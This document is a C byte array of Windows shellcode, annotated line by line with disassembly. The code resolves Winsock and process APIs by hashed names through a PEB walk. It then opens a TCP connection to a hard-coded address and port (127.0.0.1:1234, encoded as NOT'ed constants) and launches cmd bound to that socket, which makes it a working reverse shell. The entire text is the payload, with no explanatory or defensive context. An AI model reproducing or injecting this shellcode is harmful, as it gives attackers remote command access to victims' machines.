
#define CONNECT_SIZE 553

char CONNECT[] = {
  /* 0000 */ "\x53"                     /* push rbx                    */
  /* 0001 */ "\x55"                     /* push rbp                    */
  /* 0002 */ "\x57"                     /* push rdi                    */
  /* 0003 */ "\x56"                     /* push rsi                    */
  /* 0004 */ "\xeb\x18"                 /* jmp 0x1e                    */
  /* 0006 */ "\x5e"                     /* pop rsi                     */
  /* 0007 */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 0009 */ "\xb1\x82"                 /* mov cl, 0x82                */
  /* 000B */ "\x48\x8d\x2c\x0e"         /* lea rbp, [rsi+rcx]          */
  /* 000F */ "\xb1\x0f"                 /* mov cl, 0xf                 */
  /* 0011 */ "\xb5\x01"                 /* mov ch, 0x1                 */
  /* 0013 */ "\x48\x8d\x14\x0e"         /* lea rdx, [rsi+rcx]          */
  /* 0017 */ "\xff\xd2"                 /* call rdx                    */
  /* 0019 */ "\x5e"                     /* pop rsi                     */
  /* 001A */ "\x5f"                     /* pop rdi                     */
  /* 001B */ "\x5d"                     /* pop rbp                     */
  /* 001C */ "\x5b"                     /* pop rbx                     */
  /* 001D */ "\xc3"                     /* ret                         */
  /* 001E */ "\xe8\xe3\xff\xff\xff"     /* call 0x6                    */
  /* 0023 */ "\x51"                     /* push rcx                    */
  /* 0024 */ "\x52"                     /* push rdx                    */
  /* 0025 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 0027 */ "\x99"                     /* cdq                         */
  /* 0028 */ "\xac"                     /* lodsb                       */
  /* 0029 */ "\x84\xc0"                 /* test al, al                 */
  /* 002B */ "\x74\x15"                 /* jz 0x42                     */
  /* 002D */ "\x0c\x20"                 /* or al, 0x20                 */
  /* 002F */ "\x30\xc2"                 /* xor dl, al                  */
  /* 0031 */ "\x6a\x08"                 /* push 0x8                    */
  /* 0033 */ "\x59"                     /* pop rcx                     */
  /* 0034 */ "\xd1\xea"                 /* shr edx, 1                  */
  /* 0036 */ "\x73\x06"                 /* jae 0x3e                    */
  /* 0038 */ "\x81\xf2\x78\x3b\xf6\x82" /* xor edx, 0x82f63b78         */
  /* 003E */ "\xe2\xf4"                 /* loop 0x34                   */
  /* 0040 */ "\xeb\xe6"                 /* jmp 0x28                    */
  /* 0042 */ "\x92"                     /* xchg edx, eax               */
  /* 0043 */ "\x5a"                     /* pop rdx                     */
  /* 0044 */ "\x59"                     /* pop rcx                     */
  /* 0045 */ "\xc3"                     /* ret                         */
  /* 0046 */ "\x57"                     /* push rdi                    */
  /* 0047 */ "\x53"                     /* push rbx                    */
  /* 0048 */ "\x52"                     /* push rdx                    */
  /* 0049 */ "\x56"                     /* push rsi                    */
  /* 004A */ "\x03\x55\x3c"             /* add edx, [rbp+0x3c]         */
  /* 004D */ "\x8b\x4c\x15\x28"         /* mov ecx, [rbp+rdx+0x28]     */
  /* 0051 */ "\xe3\x4d"                 /* jrcxz 0xa0                  */
  /* 0053 */ "\x56"                     /* push rsi                    */
  /* 0054 */ "\x8b\x74\x0d\x0c"         /* mov esi, [rbp+rcx+0xc]      */
  /* 0058 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 005B */ "\xe8\xc3\xff\xff\xff"     /* call 0x23                   */
  /* 0060 */ "\x97"                     /* xchg edi, eax               */
  /* 0061 */ "\x8b\x74\x0d\x1c"         /* mov esi, [rbp+rcx+0x1c]     */
  /* 0065 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0068 */ "\x8b\x54\x0d\x20"         /* mov edx, [rbp+rcx+0x20]     */
  /* 006C */ "\x48\x01\xea"             /* add rdx, rbp                */
  /* 006F */ "\x8b\x5c\x0d\x24"         /* mov ebx, [rbp+rcx+0x24]     */
  /* 0073 */ "\x48\x01\xeb"             /* add rbx, rbp                */
  /* 0076 */ "\x8b\x4c\x0d\x18"         /* mov ecx, [rbp+rcx+0x18]     */
  /* 007A */ "\x58"                     /* pop rax                     */
  /* 007B */ "\xe3\x23"                 /* jrcxz 0xa0                  */
  /* 007D */ "\x53"                     /* push rbx                    */
  /* 007E */ "\x56"                     /* push rsi                    */
  /* 007F */ "\x93"                     /* xchg ebx, eax               */
  /* 0080 */ "\x8b\x74\x8a\xfc"         /* mov esi, [rdx+rcx*4-0x4]    */
  /* 0084 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0087 */ "\xe8\x97\xff\xff\xff"     /* call 0x23                   */
  /* 008C */ "\x01\xf8"                 /* add eax, edi                */
  /* 008E */ "\x39\xd8"                 /* cmp eax, ebx                */
  /* 0090 */ "\xe0\xee"                 /* loopne 0x80                 */
  /* 0092 */ "\x5e"                     /* pop rsi                     */
  /* 0093 */ "\x5b"                     /* pop rbx                     */
  /* 0094 */ "\x75\x0a"                 /* jnz 0xa0                    */
  /* 0096 */ "\x0f\xb7\x1c\x4b"         /* movzx ebx, word [rbx+rcx*2] */
  /* 009A */ "\x8b\x0c\x9e"             /* mov ecx, [rsi+rbx*4]        */
  /* 009D */ "\x48\x01\xe9"             /* add rcx, rbp                */
  /* 00A0 */ "\x5e"                     /* pop rsi                     */
  /* 00A1 */ "\x5a"                     /* pop rdx                     */
  /* 00A2 */ "\x5b"                     /* pop rbx                     */
  /* 00A3 */ "\x5f"                     /* pop rdi                     */
  /* 00A4 */ "\xc3"                     /* ret                         */
  /* 00A5 */ "\x0f\xb6\xc9"             /* movzx ecx, cl               */
  /* 00A8 */ "\x51"                     /* push rcx                    */
  /* 00A9 */ "\x53"                     /* push rbx                    */
  /* 00AA */ "\x57"                     /* push rdi                    */
  /* 00AB */ "\x56"                     /* push rsi                    */
  /* 00AC */ "\x55"                     /* push rbp                    */
  /* 00AD */ "\x96"                     /* xchg esi, eax               */
  /* 00AE */ "\x31\xdb"                 /* xor ebx, ebx                */
  /* 00B0 */ "\xf7\xe3"                 /* mul ebx                     */
  /* 00B2 */ "\xb3\x30"                 /* mov bl, 0x30                */
  /* 00B4 */ "\x48\x79\x0f"             /* jns 0xc6                    */
  /* 00B7 */ "\x64\x8b\x3b"             /* mov edi, [fs:rbx]           */
  /* 00BA */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00BD */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00C0 */ "\xb3\x18"                 /* mov bl, 0x18                */
  /* 00C2 */ "\xb2\x50"                 /* mov dl, 0x50                */
  /* 00C4 */ "\xeb\x1d"                 /* jmp 0xe3                    */
  /* 00C6 */ "\xb2\x60"                 /* mov dl, 0x60                */
  /* 00C8 */ "\x65\x48\x8b\x3a"         /* mov rdi, [gs:rdx]           */
  /* 00CC */ "\x48\x8b\x7f\x18"         /* mov rdi, [rdi+0x18]         */
  /* 00D0 */ "\x48\x8b\x7f\x10"         /* mov rdi, [rdi+0x10]         */
  /* 00D4 */ "\xeb\x0d"                 /* jmp 0xe3                    */
  /* 00D6 */ "\xe8\x6b\xff\xff\xff"     /* call 0x46                   */
  /* 00DB */ "\x48\x85\xc9"             /* test rcx, rcx               */
  /* 00DE */ "\x75\x0e"                 /* jnz 0xee                    */
  /* 00E0 */ "\x48\x8b\x3f"             /* mov rdi, [rdi]              */
  /* 00E3 */ "\x48\x8b\x2c\x1f"         /* mov rbp, [rdi+rbx]          */
  /* 00E7 */ "\x48\x85\xed"             /* test rbp, rbp               */
  /* 00EA */ "\x75\xea"                 /* jnz 0xd6                    */
  /* 00EC */ "\x55"                     /* push rbp                    */
  /* 00ED */ "\x59"                     /* pop rcx                     */
  /* 00EE */ "\x5d"                     /* pop rbp                     */
  /* 00EF */ "\x5e"                     /* pop rsi                     */
  /* 00F0 */ "\x5f"                     /* pop rdi                     */
  /* 00F1 */ "\x5b"                     /* pop rbx                     */
  /* 00F2 */ "\x5a"                     /* pop rdx                     */
  /* 00F3 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 00F5 */ "\x48\x79\x02"             /* jns 0xfa                    */
  /* 00F8 */ "\xff\xe1"                 /* jmp rcx                     */
  /* 00FA */ "\x41\x89\xd4"             /* mov r12d, edx               */
  /* 00FD */ "\x49\x89\xcb"             /* mov r11, rcx                */
  /* 0100 */ "\x41\x5f"                 /* pop r15                     */
  /* 0102 */ "\x45\x85\xe4"             /* test r12d, r12d             */
  /* 0105 */ "\x74\x1c"                 /* jz 0x123                    */
  /* 0107 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 010B */ "\x59"                     /* pop rcx                     */
  /* 010C */ "\x74\x15"                 /* jz 0x123                    */
  /* 010E */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0112 */ "\x5a"                     /* pop rdx                     */
  /* 0113 */ "\x74\x0e"                 /* jz 0x123                    */
  /* 0115 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0119 */ "\x41\x58"                 /* pop r8                      */
  /* 011B */ "\x74\x06"                 /* jz 0x123                    */
  /* 011D */ "\x41\x59"                 /* pop r9                      */
  /* 011F */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0123 */ "\x48\x83\xec\x20"         /* sub rsp, 0x20               */
  /* 0127 */ "\x41\xff\xd3"             /* call r11                    */
  /* 012A */ "\x4a\x8d\x64\xe4\x20"     /* lea rsp, [rsp+r12*8+0x20]   */
  /* 012F */ "\x41\x57"                 /* push r15                    */
  /* 0131 */ "\xc3"                     /* ret                         */
  /* 0132 */ "\x31\xd2"                 /* xor edx, edx                */
  /* 0134 */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 0136 */ "\x48\x29\xd4"             /* sub rsp, rdx                */
  /* 0139 */ "\x54"                     /* push rsp                    */
  /* 013A */ "\x5f"                     /* pop rdi                     */
  /* 013B */ "\x57"                     /* push rdi                    */
  /* 013C */ "\xb8\x77\x73\x32\x5f"     /* mov eax, 0x5f327377         */
  /* 0141 */ "\xab"                     /* stosd                       */
  /* 0142 */ "\xb8\xcc\xcd\xff\xff"     /* mov eax, 0xffffcdcc         */
  /* 0147 */ "\xf7\xd0"                 /* not eax                     */
  /* 0149 */ "\xab"                     /* stosd                       */
  /* 014A */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 014C */ "\xb8\x02\x66\x1d\x7e"     /* mov eax, 0x7e1d6602         */
  /* 0151 */ "\xff\xd5"                 /* call rbp                    */
  /* 0153 */ "\x57"                     /* push rdi                    */
  /* 0154 */ "\x6a\x02"                 /* push 0x2                    */
  /* 0156 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0158 */ "\xb8\xe6\x2c\x63\xca"     /* mov eax, 0xca632ce6         */
  /* 015D */ "\xff\xd5"                 /* call rbp                    */
  /* 015F */ "\x85\xc0"                 /* test eax, eax               */
  /* 0161 */ "\x75\x41"                 /* jnz 0x1a4                   */
  /* 0163 */ "\x50"                     /* push rax                    */
  /* 0164 */ "\x50"                     /* push rax                    */
  /* 0165 */ "\x50"                     /* push rax                    */
  /* 0166 */ "\x50"                     /* push rax                    */
  /* 0167 */ "\x6a\x01"                 /* push 0x1                    */
  /* 0169 */ "\x6a\x02"                 /* push 0x2                    */
  /* 016B */ "\xb1\x06"                 /* mov cl, 0x6                 */
  /* 016D */ "\xb8\xc5\x75\xe0\xc8"     /* mov eax, 0xc8e075c5         */
  /* 0172 */ "\xff\xd5"                 /* call rbp                    */
  /* 0174 */ "\x93"                     /* xchg ebx, eax               */
  /* 0175 */ "\x6a\x10"                 /* push 0x10                   */
  /* 0177 */ "\x57"                     /* push rdi                    */
  /* 0178 */ "\xb8\xfd\xff\xfb\x2d"     /* mov eax, 0x2dfbfffd         */
  /* 017D */ "\xf7\xd0"                 /* not eax                     */
  /* 017F */ "\xab"                     /* stosd                       */
  /* 0180 */ "\xb8\x80\xff\xff\xfe"     /* mov eax, 0xfeffff80         */
  /* 0185 */ "\xf7\xd0"                 /* not eax                     */
  /* 0187 */ "\xab"                     /* stosd                       */
  /* 0188 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 018A */ "\xab"                     /* stosd                       */
  /* 018B */ "\xab"                     /* stosd                       */
  /* 018C */ "\x53"                     /* push rbx                    */
  /* 018D */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 018F */ "\xb8\x85\x69\xe1\x61"     /* mov eax, 0x61e16985         */
  /* 0194 */ "\xff\xd5"                 /* call rbp                    */
  /* 0196 */ "\x85\xc0"                 /* test eax, eax               */
  /* 0198 */ "\x74\x12"                 /* jz 0x1ac                    */
  /* 019A */ "\x53"                     /* push rbx                    */
  /* 019B */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 019D */ "\xb8\x3c\xd3\xca\xb2"     /* mov eax, 0xb2cad33c         */
  /* 01A2 */ "\xff\xd5"                 /* call rbp                    */
  /* 01A4 */ "\x31\xd2"                 /* xor edx, edx                */
  /* 01A6 */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 01A8 */ "\x48\x01\xd4"             /* add rsp, rdx                */
  /* 01AB */ "\xc3"                     /* ret                         */
  /* 01AC */ "\xb0\x68"                 /* mov al, 0x68                */
  /* 01AE */ "\x57"                     /* push rdi                    */
  /* 01AF */ "\xab"                     /* stosd                       */
  /* 01B0 */ "\x91"                     /* xchg ecx, eax               */
  /* 01B1 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01B3 */ "\xf3\xaa"                 /* rep stosb                   */
  /* 01B5 */ "\x5f"                     /* pop rdi                     */
  /* 01B6 */ "\x57"                     /* push rdi                    */
  /* 01B7 */ "\x48\x78\x02"             /* js 0x1bc                    */
  /* 01BA */ "\xb1\x18"                 /* mov cl, 0x18                */
  /* 01BC */ "\x48\x8d\x7c\x0f\x38"     /* lea rdi, [rdi+rcx+0x38]     */
  /* 01C1 */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 01C3 */ "\x89\x1f"                 /* mov [rdi], ebx              */
  /* 01C5 */ "\x48\xaf"                 /* scasq                       */
  /* 01C7 */ "\xe2\xfa"                 /* loop 0x1c3                  */
  /* 01C9 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01CB */ "\x48\x78\x02"             /* js 0x1d0                    */
  /* 01CE */ "\xb1\x10"                 /* mov cl, 0x10                */
  /* 01D0 */ "\x5a"                     /* pop rdx                     */
  /* 01D1 */ "\xff\x44\x0a\x2d"         /* inc dword [rdx+rcx+0x2d]    */
  /* 01D5 */ "\xb8\x9c\x92\x9b\xff"     /* mov eax, 0xff9b929c         */
  /* 01DA */ "\xf7\xd0"                 /* not eax                     */
  /* 01DC */ "\x57"                     /* push rdi                    */
  /* 01DD */ "\xab"                     /* stosd                       */
  /* 01DE */ "\x58"                     /* pop rax                     */
  /* 01DF */ "\x57"                     /* push rdi                    */
  /* 01E0 */ "\x52"                     /* push rdx                    */
  /* 01E1 */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 01E3 */ "\x6a\x08"                 /* push 0x8                    */
  /* 01E5 */ "\x5a"                     /* pop rdx                     */
  /* 01E6 */ "\xc1\xe2\x18"             /* shl edx, 0x18               */
  /* 01E9 */ "\x51"                     /* push rcx                    */
  /* 01EA */ "\x51"                     /* push rcx                    */
  /* 01EB */ "\x52"                     /* push rdx                    */
  /* 01EC */ "\x6a\x01"                 /* push 0x1                    */
  /* 01EE */ "\x51"                     /* push rcx                    */
  /* 01EF */ "\x51"                     /* push rcx                    */
  /* 01F0 */ "\x50"                     /* push rax                    */
  /* 01F1 */ "\x51"                     /* push rcx                    */
  /* 01F2 */ "\xb1\x0a"                 /* mov cl, 0xa                 */
  /* 01F4 */ "\xb8\xb1\xfe\xc6\x5f"     /* mov eax, 0x5fc6feb1         */
  /* 01F9 */ "\xff\xd5"                 /* call rbp                    */
  /* 01FB */ "\xf7\xd8"                 /* neg eax                     */
  /* 01FD */ "\x79\x9b"                 /* jns 0x19a                   */
  /* 01FF */ "\x57"                     /* push rdi                    */
  /* 0200 */ "\x5e"                     /* pop rsi                     */
  /* 0201 */ "\x50"                     /* push rax                    */
  /* 0202 */ "\x8b\x06"                 /* mov eax, [rsi]              */
  /* 0204 */ "\x50"                     /* push rax                    */
  /* 0205 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0207 */ "\xb8\x7e\x6a\xe6\x31"     /* mov eax, 0x31e66a7e         */
  /* 020C */ "\xff\xd5"                 /* call rbp                    */
  /* 020E */ "\xad"                     /* lodsd                       */
  /* 020F */ "\x50"                     /* push rax                    */
  /* 0210 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 0212 */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 0217 */ "\xff\xd5"                 /* call rbp                    */
  /* 0219 */ "\xad"                     /* lodsd                       */
  /* 021A */ "\x50"                     /* push rax                    */
  /* 021B */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 021D */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 0222 */ "\xff\xd5"                 /* call rbp                    */
  /* 0224 */ "\xe9\x71\xff\xff\xff"     /* jmp 0x19a                   */
};
